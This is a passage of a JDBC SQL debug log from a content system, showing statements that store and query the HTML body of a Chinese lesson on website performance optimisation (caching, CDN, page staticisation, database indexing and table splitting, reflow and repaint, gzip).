data-key="1178"> <span data-slate-object="text" data-key="1179"><span data-slate-leaf="true" 
data-offset-key="1179:0" data-first-offset="true"><span data-slate-string="true">缓存控制头部。即 Cache-Control 
头，这部分我们在 </span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1180" 
class="se-bd361ee3 se-f81bfce9"><span data-slate-object="text" data-key="1181"><span data-slate-leaf="true" 
data-offset-key="1181:0" data-first-offset="true"><span data-slate-string="true">[第 21 讲]</span></span></span></a><span 
data-slate-object="text" data-key="1182"><span data-slate-leaf="true" data-offset-key="1182:0" 
data-first-offset="true"><span data-slate-string="true"> 已经介绍过；还有 Etag 头，浏览器会把它发送给服务端用于鉴别目标资源是否发生了更改，如果没有更改，一个 
304 响应会返回；以及 Expires 头，是服务端来指定过期时间的。</span></span></span> </div> </div> <h3 class="se-12252576" 
data-slate-type="heading" data-slate-object="block" data-key="1183"><span data-slate-object="text" 
data-key="1184"><span data-slate-leaf="true" data-offset-key="1184:0" data-first-offset="true"><span 
data-slate-string="true">2. 减少渲染次数</span></span></span></h3> <div class="se-408ffdd7 " data-slate-type="paragraph" 
data-slate-object="block" data-key="1185"> <span data-slate-object="text" data-key="1186"><span 
data-slate-leaf="true" data-offset-key="1186:0" data-first-offset="true"><span data-slate-string="true">CSS 
或者 DOM 的变化都会引发渲染，而渲染是由单独的线程来进行的，这个过程会阻塞用户的操作。对于较大的页面、DOM 较多的页面，浏览器渲染会占用大量的 CPU 并带来明显的停顿时间。</span></span></span> 
</div> <div class="se-a5939b2c " data-slate-type="paragraph" data-slate-object="block" data-key="1187"> 
<span data-slate-object="text" data-key="1188"><span data-slate-leaf="true" data-offset-key="1188:0" 
data-first-offset="true"><span data-slate-string="true">渲染其实包括两种，一种是 reflow，就是页面元素的位置、间隔等等发生更改，这个工作是由 
CPU 完成的；另一种叫做 repaint，基本上就是当颜色等发生变更的时候就需要重新绘制，这个工作是由 GPU 完成的。</span></span></span> </div> <div 
class="se-6b6cd52d " data-slate-type="paragraph" data-slate-object="block" data-key="1189"> 
<span data-slate-object="text" data-key="1190"><span data-slate-leaf="true" data-offset-key="1190:0" 
data-first-offset="true"><span data-slate-string="true">因此，如果我们能够减少反复、多次，或是无意义的渲染，就可以在一定程度上为 
Web 应用提速，特别是 reflow。那么对于这方面优化的其中一个思路，就是合并操作，即可以合并多个 DOM 操作为一次进行，或是合并单个 DOM 的多次操作为一次进行（React 
或者 Vue.js 的 Virtual DOM 技术就借鉴了这种思路）。</span></span></span> </div> <h3 class="se-89e6bfff" data-slate-type="heading" 
data-slate-object="block" data-key="1191"><span data-slate-object="text" data-key="1192"><span 
data-slate-leaf="true" data-offset-key="1192:0" data-first-offset="true"><span data-slate-string="true">3. 
减少 JavaScript 阻塞</span></span></span></h3> <div class="se-c109c5b4 " data-slate-type="paragraph" 
data-slate-object="block" data-key="1193"> <span data-slate-object="text" data-key="1194"><span 
data-slate-leaf="true" data-offset-key="1194:0" data-first-offset="true"><span data-slate-string="true">JavaScript 
阻塞，本质上是由于 JavaScript 解释执行是单线程所造成的，阻塞期间浏览器拒绝响应用户的操作。同步的 Ajax 调用会引发阻塞（一直阻塞到响应返回），耗时的 JavaScript 
代码执行也会引起阻塞。</span></span></span> </div> <div class="se-002b977c " data-slate-type="paragraph" 
data-slate-object="block" data-key="1195"> <span data-slate-object="text" data-key="1196"><span 
data-slate-leaf="true" data-offset-key="1196:0" data-first-offset="true"><span data-slate-string="true">我们通过将大的工作分裂成多次执行（可以通过每次具备一定间隔时间的回调来实现），每次执行后主动让出执行线程，这样每次就可以只阻塞一小会儿，以显著减少 
JavaScript 阻塞对用户造成的影响；而对于一些独立的耗时操作，可以引入 </span></span></span><a data-slate-type="link" data-slate-object="inline" 
data-key="1197" class="se-bd361ee3 se-f81bfce9"><span data-slate-object="text" data-key="1198"><span 
data-slate-leaf="true" data-offset-key="1198:0" data-first-offset="true"><span data-slate-string="true">Web 
Worker</span></span></span></a><span data-slate-object="text" data-key="1199"><span data-slate-leaf="true" 
data-offset-key="1199:0" data-first-offset="true"><span data-slate-string="true"> 分配单独运行的线程来完成。</span></span></span> 
</div> <h3 class="se-047c2833" data-slate-type="heading" data-slate-object="block" data-key="1200"><span 
data-slate-object="text" data-key="1201"><span data-slate-leaf="true" data-offset-key="1201:0" 
data-first-offset="true"><span data-slate-string="true">4. 文本消息压缩</span></span></span></h3> 
<div class="se-8433d25b " data-slate-type="paragraph" data-slate-object="block" data-key="1202"> 
<span data-slate-object="text" data-key="1203"><span data-slate-leaf="true" data-offset-key="1203:0" 
data-first-offset="true"><span data-slate-string="true">对于页面这样的文本内容，通过配置 Web 容器的 gzip 压缩，可以获得很好的压缩比，从而减小消息体的大小，减少消息传输的时间，代价是压缩和解压缩需要消耗 
CPU 时间。</span></span></span> </div> <div class="se-425bfe95 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1204"> <span data-slate-object="text" data-key="1205"><span data-slate-leaf="true" 
data-offset-key="1205:0" data-first-offset="true"><span class="se-fa55b3e6" data-slate-type="bold" 
data-slate-object="mark"><span data-slate-string="true">这种优化的本质是时间换空间，而前面介绍过的缓存本质则是空间换时间</span></span></span></span><span 
data-slate-object="text" data-key="1206"><span data-slate-leaf="true" data-offset-key="1206:0" 
data-first-offset="true"><span data-slate-string="true">，二者比起来，刚好是相反的。可有趣的是，它们的目的却是一致的，都是为了缩短用户访问的时间，都是为了减少延迟。</span></span></span> 
</div> <div class="se-c6660aca " data-slate-type="paragraph" data-slate-object="block" data-key="1207"> 
<span data-slate-object="text" data-key="1208"><span data-slate-leaf="true" data-offset-key="1208:0" 
data-first-offset="true"><span data-slate-string="true">对于前端的优化，技巧比较零散，可能有不少朋友会想起那最著名的 </span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1209" class="se-bd361ee3 se-f81bfce9"><span 
data-slate-object="text" data-key="1210"><span data-slate-leaf="true" data-offset-key="1210:0" 
data-first-offset="true"><span data-slate-string="true">35 条军规</span></span></span></a><span 
data-slate-object="text" data-key="1211"><span data-slate-leaf="true" data-offset-key="1211:0" 
data-first-offset="true"><span data-slate-string="true">（中文译文有不少，比如</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1212" class="se-bd361ee3 se-f81bfce9"><span 
data-slate-object="text" data-key="1213"><span data-slate-leaf="true" data-offset-key="1213:0" 
data-first-offset="true"><span data-slate-string="true">这里</span></span></span></a><span data-slate-object="text" 
data-key="1214"><span data-slate-leaf="true" data-offset-key="1214:0" data-first-offset="true"><span 
data-slate-string="true">），这篇文章是如今很多前端技能优化学习首先要阅读的“老文章”了。</span></span></span> </div> <h2 class="se-b407d3b1" 
data-slate-type="heading" data-slate-object="block" data-key="1215"><span data-slate-object="text" 
data-key="1216"><span data-slate-leaf="true" data-offset-key="1216:0" data-first-offset="true"><span 
data-slate-string="true">总结思考</span></span></span></h2> <div class="se-0afb2195 " data-slate-type="paragraph" 
data-slate-object="block" data-key="1217"> <span data-slate-object="text" data-key="1218"><span 
data-slate-leaf="true" data-offset-key="1218:0" data-first-offset="true"><span data-slate-string="true">今天我从产品和架构、后端和持久化，以及前端和网络层三个角度，结合一些具体的技巧，向你介绍了一些常见的网站性能优化方法。网站的性能优化是一个大课题，希望你在学完上一讲和这一讲之后，你能从前到后比较全面地去分析和思考问题。</span></span></span> 
</div> <div class="se-8c978c27 " data-slate-type="paragraph" data-slate-object="block" data-key="1219"> 
<span data-slate-object="text" data-key="1220"><span data-slate-leaf="true" data-offset-key="1220:0" 
data-first-offset="true"><span data-slate-string="true">下面我来提两个问题吧：</span></span></span> </div> 
<div class="se-c3193518" data-slate-type="list" data-slate-object="block" data-key="1221"> 
<div class="se-91ed3846 se-6602e272" data-slate-type="list-line" data-slate-object="block" 
data-key="1222"> <span data-slate-object="text" data-key="1223"><span data-slate-leaf="true" 
data-offset-key="1223:0" data-first-offset="true"><span data-slate-string="true">你在项目中是否做过性能优化的工作，能否介绍一下你都进行了哪些有效的优化实践呢？</span></span></span> 
</div> <div class="se-f0c70cc0 se-b31d1a0f" data-slate-type="list-line" data-slate-object="block" 
data-key="1224"> <span data-slate-object="text" data-key="1225"><span data-slate-leaf="true" 
data-offset-key="1225:0" data-first-offset="true"><span data-slate-string="true">文中介绍了数据库表拆分的两种方式，水平拆分和垂直拆分，它们都带来了显而易见的好处。可是，我们总是需要辩证地去看待一项技术，你能说出它们会带来哪些坏处吗？</span></span></span> 
</div> </div> <h2 class="se-f85d16c7" data-slate-type="heading" data-slate-object="block" data-key="1226"><span 
data-slate-object="text" data-key="1227"><span data-slate-leaf="true" data-offset-key="1227:0" 
data-first-offset="true"><span data-slate-string="true">扩展阅读</span></span></span></h2> <div 
class="se-9eca27db" data-slate-type="list" data-slate-object="block" data-key="1228"> <div 
class="se-139cfaf4 se-c4a85144" data-slate-type="list-line" data-slate-object="block" data-key="1229"> 
<span data-slate-object="text" data-key="1230"><span data-slate-leaf="true" data-offset-key="1230:0" 
data-first-offset="true"><span data-slate-string="true">文中提到了 Amazon 对于 SOA 的实践，你可以阅读</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1231" class="se-bd361ee3 se-f81bfce9"><span 
data-slate-object="text" data-key="1232"><span data-slate-leaf="true" data-offset-key="1232:0" 
data-first-offset="true"><span data-slate-string="true">这篇文章</span></span></span></a><span 
data-slate-object="text" data-key="1233"><span data-slate-leaf="true" data-offset-key="1233:0" 
data-first-offset="true"><span data-slate-string="true">简单了解一下这个故事。</span></span></span> </div> 
<div class="se-bd574342 se-4036514b" data-slate-type="list-line" data-slate-object="block" 
data-key="1234"> <span data-slate-object="text" data-key="1235"><span data-slate-leaf="true" 
data-offset-key="1235:0" data-first-offset="true"><span data-slate-string="true">本文主要讲的还是应用层面的调优，没有介绍虚拟机、容器等性能优化和操作系统的性能优化。如果你对它们感兴趣的话，我在这里推荐两个材料。关于 
JVM 调优，可以参看 </span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1236" 
class="se-bd361ee3 se-f81bfce9"><span data-slate-object="text" data-key="1237"><span data-slate-leaf="true" 
data-offset-key="1237:0" data-first-offset="true"><span data-slate-string="true">Java 应用性能调优实践</span></span></span></a><span 
data-slate-object="text" data-key="1238"><span data-slate-leaf="true" data-offset-key="1238:0" 
data-first-offset="true"><span data-slate-string="true">这篇，而操作系统层面的性能优化，你可以从 </span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1239" class="se-bd361ee3 se-f81bfce9"><span 
data-slate-object="text" data-key="1240"><span data-slate-leaf="true" data-offset-key="1240:0" 
data-first-offset="true"><span data-slate-string="true">Linux 性能调优指南</span></span></span></a><span 
data-slate-object="text" data-key="1241"><span data-slate-leaf="true" data-offset-key="1241:0" 
data-first-offset="true"><span data-slate-string="true">这个材料中找感兴趣的阅读。</span></span></span> 
</div> <div class="se-1ad822f6 se-a2998807" data-slate-type="list-line" data-slate-object="block" 
data-key="1242"> <a data-slate-type="link" data-slate-object="inline" data-key="1243" class="se-bd361ee3 
se-f81bfce9"><span data-slate-object="text" data-key="1244"><span data-slate-leaf="true" data-offset-key="1244:0" 
data-first-offset="true"><span data-slate-string="true">从 Webkit 内部渲染机制出发，谈网站渲染性能优化</span></span></span></a><span 
data-slate-object="text" data-key="1245"><span data-slate-leaf="true" data-offset-key="1245:0" 
data-first-offset="true"><span data-slate-string="true">，这篇文章是从浏览器的机制这个角度来讲性能优化的，推荐一读。</span></span></span> 
</div> <div class="se-22ed3d8c se-04c89fbe" data-slate-type="list-line" data-slate-object="block" 
data-key="1246"> <span data-slate-object="text" data-key="1247"><span data-slate-leaf="true" 
data-offset-key="1247:0" data-first-offset="true"><span data-slate-string="true">文中介绍了 reflow 
和 repaint，对于这方面的优化可以阅读 </span></span></span><a data-slate-type="link" data-slate-object="inline" 
data-key="1248" class="se-bd361ee3 se-f81bfce9"><span data-slate-object="text" data-key="1249"><span 
data-slate-leaf="true" data-offset-key="1249:0" data-first-offset="true"><span data-slate-string="true">reflow 
和 repaint 引发的性能问题</span></span></span></a><span data-slate-object="text" data-key="1250"><span 
data-slate-leaf="true" data-offset-key="1250:0" data-first-offset="true"><span data-slate-string="true">这篇文章。</span></span></span> 
</div> </div> <div class="se-87d2343b" data-slate-type="image" data-slate-object="block" data-key="1251"> 
<img class="se-09bc7f01" src="https://static001.geekbang.org/resource/image/11/8b/1181246bbd51ce348d5729696d1dc28b.jpg"> 
</div> </div>', '', 'book', 0, 'full_html', 'zh-hans', 10, 10) 
 {executed in 15 msec}
2020-11-19 11:05:09.434 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_0_, nodebodyen0_.body_value as body_val2_3_0_, 
nodebodyen0_.body_summary as body_sum3_3_0_, nodebodyen0_.bundle as bundle4_3_0_, nodebodyen0_.delta 
as delta5_3_0_, nodebodyen0_.body_format as body_for6_3_0_, nodebodyen0_.langcode as langcode7_3_0_, 
nodebodyen0_.revision_id as revision8_3_0_ from node__body nodebodyen0_ where nodebodyen0_.entity_id=10 
 {executed in 0 msec}
2020-11-19 11:05:09.434 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:05:09.447 INFO  jdbc.sqltiming Line:373 - insert into node__body (body_value, body_summary, bundle, delta, body_format, langcode, revision_id, 
entity_id) values ('<div data-slate-editor="true" data-key="994" autocorrect="off" spellcheck="false" 
data-gramm="false" style="outline: none; white-space: pre-wrap; overflow-wrap: break-word;"> 
<div class="se-a1a5edcc " data-slate-type="paragraph" data-slate-object="block" data-key="995"> 
<span data-slate-object="text" data-key="996"><span data-slate-leaf="true" data-offset-key="996:0" 
data-first-offset="true"><span data-slate-string="true">你好，我是四火。</span></span></span> </div> 
<div class="se-ad26e9b2 " data-slate-type="paragraph" data-slate-object="block" data-key="997"> 
<span data-slate-object="text" data-key="998"><span data-slate-leaf="true" data-offset-key="998:0" 
data-first-offset="true"><span data-slate-string="true">上一讲我们介绍了网站性能优化的基础知识，包括性能指标、关注点，以及寻找性能瓶颈的思路。那么这一讲，我们就来介绍网站性能优化的具体方法，我们将从产品和架构、后端和持久层，以及前端和网络层这样三个部分分别展开。优化的角度和方法可以说花样繁多，我在这里举一些典型的例子，希望既能给你一些内容上的介绍，进而拓宽视野，也能给你一些思考角度上的启发。</span></span></span> 
</div> <h2 class="se-4de06332" data-slate-type="heading" data-slate-object="block" data-key="999"><span 
data-slate-object="text" data-key="1000"><span data-slate-leaf="true" data-offset-key="1000:0" 
data-first-offset="true"><span data-slate-string="true">产品和架构调整</span></span></span></h2> <div 
class="se-e6b0a805 " data-slate-type="paragraph" data-slate-object="block" data-key="1001"> 
<span data-slate-object="text" data-key="1002"><span data-slate-leaf="true" data-offset-key="1002:0" 
data-first-offset="true"><span data-slate-string="true">对于一个应用来说，产品和架构恰巧是两个互相对立而又相辅相成的角度。作为全栈工程师，我们当然鼓励追求细节，但是在考虑性能优化的时候，我认为还是要</span></span></span><span 
data-slate-object="text" data-key="1003"><span data-slate-leaf="true" data-offset-key="1003:0" 
data-first-offset="true"><span class="se-0da322c4" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">优先考虑从大处着眼，而不是把大量时间花费在小处的细节提升上</span></span></span></span><span data-slate-object="text" 
data-key="1004"><span data-slate-leaf="true" data-offset-key="1004:0" data-first-offset="true"><span 
data-slate-string="true">，以期望获得较为明显的效果。这里的“大处”，就主要包含了产品和技术架构两个维度。</span></span></span> </div> 
<h3 class="se-d87c2163" data-slate-type="heading" data-slate-object="block" data-key="1005"><span 
data-slate-object="text" data-key="1006"><span data-slate-leaf="true" data-offset-key="1006:0" 
data-first-offset="true"><span data-slate-string="true">1. 同步变异步</span></span></span></h3> 
<div class="se-31ac52c7 " data-slate-type="paragraph" data-slate-object="block" data-key="1007"> 
<span data-slate-object="text" data-key="1008"><span data-slate-leaf="true" data-offset-key="1008:0" 
data-first-offset="true"><span data-slate-string="true">如果页面聚合在服务端进行，那么渲染前等待的时间，在整个任务依赖树上面，取决于最慢的一个路径什么时候完成；而如果页面聚合是在客户端进行的，那么页面每一个子区域的渲染往往都可以以 
Ajax 的方式独立进行，且同时进行，而母页面则可以首先展示给用户，减少用户的等待时间。</span></span></span> </div> <div class="se-921faffa 
" data-slate-type="paragraph" data-slate-object="block" data-key="1009"> <span data-slate-object="text" 
data-key="1010"><span data-slate-leaf="true" data-offset-key="1010:0" data-first-offset="true"><span 
data-slate-string="true">这里我还想补充一点，我们可以把同步和异步结合起来使用以获得最好的效果。比方说，用户对于网页加载的延迟是很敏锐的，但是用户对于一个页面上不同的信息，关注程度是不同的。</span></span></span> 
</div> <div class="se-155a9cb4 " data-slate-type="paragraph" data-slate-object="block" data-key="1011"> 
<span data-slate-object="text" data-key="1012"><span data-slate-leaf="true" data-offset-key="1012:0" 
data-first-offset="true"><span data-slate-string="true">举例来说，一篇文章，标题可能是最先关注的，其次才是作者或是正文，至于评论、广告等等这些内容，优先级则更低。因此，我们可以让标题和正文内容的第一屏等高优先级的内容在服务端进行聚合后一并同步返回，这就省去了 
Ajax 二次调用的时间开销，而次要内容或是某些生成特别耗时的内容，则可以使用异步方式在客户端单独加载。</span></span></span> </div> <h3 class="se-9099d3a4" 
data-slate-type="heading" data-slate-object="block" data-key="1013"><span data-slate-object="text" 
data-key="1014"><span data-slate-leaf="true" data-offset-key="1014:0" data-first-offset="true"><span 
data-slate-string="true">2. 远程变本地</span></span></span></h3> <div class="se-e3823312 " data-slate-type="paragraph" 
data-slate-object="block" data-key="1015"> <span data-slate-object="text" data-key="1016"><span 
data-slate-leaf="true" data-offset-key="1016:0" data-first-offset="true"><span data-slate-string="true">有些时候，如果能够容许牺牲一定的一致性，而将数据从远程的数据中心冗余到“本地”这样离数据使用者更近的节点，可以减少数据获取的延迟。DNS 
的均衡路由就是一个例子，不同地区的用户访问同一个域名的时候，可以被定向到不同的离自己更近的节点上去；CDN 也是一个很典型的例子，静态资源可以从较近的本地节点获取。</span></span></span> 
</div> <h3 class="se-a03284b9" data-slate-type="heading" data-slate-object="block" data-key="1017"><span 
data-slate-object="text" data-key="1018"><span data-slate-leaf="true" data-offset-key="1018:0" 
data-first-offset="true"><span data-slate-string="true">3. 页面静态化</span></span></span></h3> 
<div class="se-9ca2b649 " data-slate-type="paragraph" data-slate-object="block" data-key="1019"> 
<span data-slate-object="text" data-key="1020"><span data-slate-leaf="true" data-offset-key="1020:0" 
data-first-offset="true"><span data-slate-string="true">对于为什么要从大处着眼，我来举一个我在项目中经历过的例子。在我们的一个网站项目，模板中使用了大量的 
OGNL 表达式，在做了 profiling 之后，发现 OGNL 表达式占用了相当比例的 CPU，而将其改成 EL 表达式等其它方式，这样做确实可以降低这些 CPU 的使用。这件事情其实没有错，但是这个处理的优先级应该往下放，因为这样的优化，可能只会带来 
10% 左右的最终性能提升。</span></span></span> </div> <div class="se-116f85cb " data-slate-type="paragraph" 
data-slate-object="block" data-key="1021"> <span data-slate-object="text" data-key="1022"><span 
data-slate-leaf="true" data-offset-key="1022:0" data-first-offset="true"><span data-slate-string="true">但是另一方面，我们逐渐引入了页面静态化技术，对于几个关键页面，它直接带来了 
300% 到 800% 的性能提升，这就让前面的页面模板的调整显得无足轻重了。性能优化就是这样，并非简单的“一分耕耘一分收获”，有时候我们能找到一些优化的办法，看起来效果很明显，但是调整的代价却不大。</span></span></span> 
</div> <div class="se-5b8fe9de " data-slate-type="paragraph" data-slate-object="block" data-key="1023"> 
<span data-slate-object="text" data-key="1024"><span data-slate-leaf="true" data-offset-key="1024:0" 
data-first-offset="true"><span data-slate-string="true">关于页面静态化，我来举一个 </span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1025" class="se-bd361ee3 se-f81bfce9"><span 
data-slate-object="text" data-key="1026"><span data-slate-leaf="true" data-offset-key="1026:0" 
data-first-offset="true"><span data-slate-string="true">StackOverflow</span></span></span></a><span 
data-slate-object="text" data-key="1027"><span data-slate-leaf="true" data-offset-key="1027:0" 
data-first-offset="true"><span data-slate-string="true"> 的例子：</span></span></span> </div> <div 
class="se-8bb6d9b4" data-slate-type="image" data-slate-object="block" data-key="1028"> <img 
class="se-c1c93fa2" src="https://static001.geekbang.org/resource/image/b0/fc/b0980cecf4fdc829e6f931acd8822efc.png"> 
</div> <div class="se-33184c91 " data-slate-type="paragraph" data-slate-object="block" data-key="1029"> 
<span data-slate-object="text" data-key="1030"><span data-slate-leaf="true" data-offset-key="1030:0" 
data-first-offset="true"><span data-slate-string="true">你看这个 StackOverflow 的页面，我们就可以按照页面静态化的原则来分析：把它划分为几个不同的区域，每个区域都可以具备自己特有的一致性要求，无论是页面还是数据，都可以单独做不同条件下的缓存。</span></span></span> 
</div> <div class="se-b40f847b " data-slate-type="paragraph" data-slate-object="block" data-key="1031"> 
<span data-slate-object="text" data-key="1032"><span data-slate-leaf="true" data-offset-key="1032:0" 
data-first-offset="true"><span data-slate-string="true">比方说，正上方和左侧区域是不会变的，这些内容可以写在静态的 HTML 
页面模板里，可以说是完全“静态”的；中间的主问题区域，则可能是定期或按一定规则刷新的，相当于在过期时间内也是静态的；而右上角和用户相关的数据，则需要每次页面访问实时生成，以便让不同的用户看到特有的属于他自己的内容，也就是说，这部分内容是完全“动态”的。</span></span></span> 
</div> <div class="se-8cd888d1 " data-slate-type="paragraph" data-slate-object="block" data-key="1033"> 
<span data-slate-object="text" data-key="1034"><span data-slate-leaf="true" data-offset-key="1034:0" 
data-first-offset="true"><span data-slate-string="true">页面静态化的实践中，我们可以将页面解耦成不同的部分：</span></span></span> 
</div> <div class="se-a38e4d7c" data-slate-type="list" data-slate-object="block" data-key="1035"> 
<div class="se-ee04bd90 se-2cd33ef0" data-slate-type="list-line" data-slate-object="block" 
data-key="1036"> <span data-slate-object="text" data-key="1037"><span data-slate-leaf="true" 
data-offset-key="1037:0" data-first-offset="true"><span data-slate-string="true">从产品的角度来定义每一个部分允许的一致性窗口，比如有的数据是一小时更新一次，数据可以不用非常准确，而有的则是要实时，数据要求非常准确；</span></span></span> 
</div> <div class="se-4c780b68 se-53d1cc67" data-slate-type="list-line" data-slate-object="block" 
data-key="1038"> <span data-slate-object="text" data-key="1039"><span data-slate-leaf="true" 
data-offset-key="1039:0" data-first-offset="true"><span data-slate-string="true">而技术角度，对于每一部分不同的一致性要求，依赖于缓存的特性，也就是空间换时间，我们可以让每个部分进行分别管理，最终聚合起来（页面聚合的方式请参见 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1040" class="se-bd361ee3 
se-f81bfce9"><span data-slate-object="text" data-key="1041"><span data-slate-leaf="true" data-offset-key="1041:0" 
data-first-offset="true"><span data-slate-string="true">[第 09 讲]</span></span></span></a><span 
data-slate-object="text" data-key="1042"><span data-slate-leaf="true" data-offset-key="1042:0" 
data-first-offset="true"><span data-slate-string="true">）。</span></span></span> </div> </div> 
<div class="se-a861d799 " data-slate-type="paragraph" data-slate-object="block" data-key="1043"> 
<span data-slate-object="text" data-key="1044"><span data-slate-leaf="true" data-offset-key="1044:0" 
data-first-offset="true"><span data-slate-string="true">在极端的情况下，整个页面是可以直接完全被缓存起来，甚至直接预先生成，而做到全页面静态化的，比如一些几乎不存在个性内容的静态博客站点就是如此。</span></span></span> 
</div> <div class="se-e5b6cfdb " data-slate-type="paragraph" data-slate-object="block" data-key="1045"> 
<span data-slate-object="text" data-key="1046"><span data-slate-leaf="true" data-offset-key="1046:0" 
data-first-offset="true"><span data-slate-string="true">当然，还有许多常见的其它架构上的设计，起着提高网站性能的作用，没有展开介绍，是因为它们已经被介绍过，或者是大家普遍比较熟悉了。比如说，对反向代理、集群和负载分担的使用，这些技术我们分别在 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1047" class="se-bd361ee3 
se-f81bfce9"><span data-slate-object="text" data-key="1048"><span data-slate-leaf="true" data-offset-key="1048:0" 
data-first-offset="true"><span data-slate-string="true">[第 28 讲]</span></span></span></a><span 
data-slate-object="text" data-key="1049"><span data-slate-leaf="true" data-offset-key="1049:0" 
data-first-offset="true"><span data-slate-string="true"> 和 </span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="1050" class="se-bd361ee3 se-f81bfce9"><span data-slate-object="text" 
data-key="1051"><span data-slate-leaf="true" data-offset-key="1051:0" data-first-offset="true"><span 
data-slate-string="true">[第 29 讲]</span></span></span></a><span data-slate-object="text" data-key="1052"><span 
data-slate-leaf="true" data-offset-key="1052:0" data-first-offset="true"><span data-slate-string="true"> 
介绍过，如今几乎所有的大型网站都使用它们来组网。</span></span></span> </div> <h2 class="se-0ffe6d06" data-slate-type="heading" 
data-slate-object="block" data-key="1053"><span data-slate-object="text" data-key="1054"><span 
data-slate-leaf="true" data-offset-key="1054:0" data-first-offset="true"><span data-slate-string="true">后端和持久层优化</span></span></span></h2> 
<h3 class="se-45e74932" data-slate-type="heading" data-slate-object="block" data-key="1055"><span 
data-slate-object="text" data-key="1056"><span data-slate-leaf="true" data-offset-key="1056:0" 
data-first-offset="true"><span data-slate-string="true">1. 串行变并行</span></span></span></h3> 
<div class="se-9a61c776 " data-slate-type="paragraph" data-slate-object="block" data-key="1057"> 
<span data-slate-object="text" data-key="1058"><span data-slate-leaf="true" data-offset-key="1058:0" 
data-first-offset="true"><span data-slate-string="true">道理上很简单，串行的逻辑，在没有依赖限制的情况下，可以并行执行。后端的逻辑如果需要执行多项操作，那么如果没有依赖，或者依赖项满足的情况下，可以立即执行，而不必一个一个挨个等待依次完成。Spring 
的 </span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1059" 
class="se-bd361ee3 se-f81bfce9"><span data-slate-object="text" data-key="1060"><span data-slate-leaf="true" 
data-offset-key="1060:0" data-first-offset="true"><span data-slate-string="true">@Async</span></span></span></a><span 
data-slate-object="text" data-key="1061"><span data-slate-leaf="true" data-offset-key="1061:0" 
data-first-offset="true"><span data-slate-string="true"> 注解，可以比较方便地将普通的 Java 方法调用变成异步进行的，用这种方法可以同时执行数个互不依赖的方法。</span></span></span> 
</div> <div class="se-396348c0 " data-slate-type="paragraph" data-slate-object="block" data-key="1062"> 
<span data-slate-object="text" data-key="1063"><span data-slate-leaf="true" data-offset-key="1063:0" 
data-first-offset="true"><span data-slate-string="true">有些朋友可能知道，Amazon 是 SOA 架构（Service-Oriented 
Architecture，面向服务架构）最早的践行者。贝索斯在 2002 年的时候，就开始要求 Amazon 内部的所有服务，都只能以 Web 接口的形式暴露出来，供其他团队调用，而每个服务，都由专门的团队维护。如今，访问亚马逊的一个商品页，借助 
SOA 架构，后台都要调用成百上千个开放的服务，你可以想象，如果这些调用是串行进行的，页面的加载时间将难以想象。</span></span></span> </div> <h3 class="se-d1121986" 
data-slate-type="heading" data-slate-object="block" data-key="1064"><span data-slate-object="text" 
data-key="1065"><span data-slate-leaf="true" data-offset-key="1065:0" data-first-offset="true"><span 
data-slate-string="true">2. 数据库索引创建</span></span></span></h3> <div class="se-db31f383 " data-slate-type="paragraph" 
data-slate-object="block" data-key="1066"> <span data-slate-object="text" data-key="1067"><span 
data-slate-leaf="true" data-offset-key="1067:0" data-first-offset="true"><span data-slate-string="true">凡是提到关系数据库的优化，索引的创建往往是很容易想到的优化方法之一。而对于某些支持半结构化数据存储的非关系数据库，往往也对索引存在有限的支持。</span></span></span> 
</div> <div class="se-285ee661 " data-slate-type="paragraph" data-slate-object="block" data-key="1068"> 
<span data-slate-object="text" data-key="1069"><span data-slate-leaf="true" data-offset-key="1069:0" 
data-first-offset="true"><span data-slate-string="true">索引的创建，最常见的一个原因，是为了在查询的时候，显著减少消耗的时间。由于索引是单独以 
B 树或者是 B+ 树等变种来存储的，而我们知道这样的数据结构查询的速度可以达到 log(n)，和原表相比，索引在检索时的数据的读取量又很小，因此查询速度的提升往往是立竿见影的。</span></span></span> 
</div> <div class="se-d3d62331 " data-slate-type="paragraph" data-slate-object="block" data-key="1070"> 
<span data-slate-object="text" data-key="1071"><span data-slate-leaf="true" data-offset-key="1071:0" 
data-first-offset="true"><span data-slate-string="true">但是索引创建并非是没有代价的，在关系数据库中，索引作为原表中索引列数据的一份冗余，维护它自然是有开销的，每当索引数据增、删、改发生的时候，索引也需要相应地发生变化。</span></span></span> 
</div> <h3 class="se-9ff35037" data-slate-type="heading" data-slate-object="block" data-key="1072"><span 
data-slate-object="text" data-key="1073"><span data-slate-leaf="true" data-offset-key="1073:0" 
data-first-offset="true"><span data-slate-string="true">3. 数据库表拆分</span></span></span></h3> 
<div class="se-f3c41ed2 " data-slate-type="paragraph" data-slate-object="block" data-key="1074"> 
<span data-slate-object="text" data-key="1075"><span data-slate-leaf="true" data-offset-key="1075:0" 
data-first-offset="true"><span data-slate-string="true">数据库表拆分也是一个很常见的优化方式，这里的拆分分为横向（水平）拆分和纵向（垂直）拆分两种。</span></span></span> 
</div> <div class="se-1a38f955 " data-slate-type="paragraph" data-slate-object="block" data-key="1076"> 
<span data-slate-object="text" data-key="1077"><span data-slate-leaf="true" data-offset-key="1077:0" 
data-first-offset="true"><span class="se-a26c2c9b" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">横向拆分，指的是把业务意义上的同一个表，拆分到不同的数据库节点或不同子表中，也就是说，这些节点中的表结构都是一样的，当然，存储的数据是不一样的。</span></span></span></span> 
</div> <div class="se-61ded8a7 " data-slate-type="paragraph" data-slate-object="block" data-key="1078"> 
<span data-slate-object="text" data-key="1079"><span data-slate-leaf="true" data-offset-key="1079:0" 
